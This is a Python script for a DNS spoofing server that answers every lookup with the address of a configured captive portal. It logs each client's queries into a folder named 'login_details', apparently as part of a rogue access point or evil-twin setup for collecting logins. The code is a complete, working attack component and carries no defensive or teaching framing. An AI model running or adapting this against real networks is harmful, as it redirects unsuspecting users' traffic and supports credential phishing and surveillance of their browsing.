import socket
import threading
import json
import os
from datetime import datetime
from dnslib import DNSRecord, RR, A, QTYPE

# Load config
with open(os.path.join(os.path.dirname(__file__), 'config.json')) as f:
    config = json.load(f)

LISTEN_IP = '0.0.0.0'
LISTEN_PORT = 53
REDIRECT_IP = config['captive_portal_ip']

log_dir = os.path.join(os.path.dirname(__file__), 'login_details')
os.makedirs(log_dir, exist_ok=True)
DNS_LOG_FILE = os.path.join(log_dir, 'dns_queries.log')

def log_dns_query(client_ip, domain):
    timestamp = datetime.now().isoformat()
    log_line = f"[{timestamp}] DNS query from {client_ip} for {domain}"
    print(log_line)
    with open(DNS_LOG_FILE, 'a') as f:
        f.write(log_line + "\n")

def handle_dns(data, addr, sock):
    try:
        request = DNSRecord.parse(data)
        client_ip = addr[0]
        for q in request.questions:
            domain = str(q.qname)
            log_dns_query(client_ip, domain)
        reply = DNSRecord(request.header)
        reply.header.qr = 1  # response
        for q in request.questions:
            reply.add_question(q)
            reply.add_answer(RR(q.qname, QTYPE.A, rdata=A(REDIRECT_IP), ttl=60))
        sock.sendto(reply.pack(), addr)
    except Exception as e:
        print(f"DNS error: {e}")

def dns_server():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((LISTEN_IP, LISTEN_PORT))
    print(f"[*] DNS spoofing server started on {LISTEN_IP}:{LISTEN_PORT}, redirecting to {REDIRECT_IP}")
    while True:
        try:
            data, addr = sock.recvfrom(512)
            threading.Thread(target=handle_dns, args=(data, addr, sock)).start()
        except Exception as e:
            print(f"DNS server error: {e}")

if __name__ == '__main__':
    dns_server()
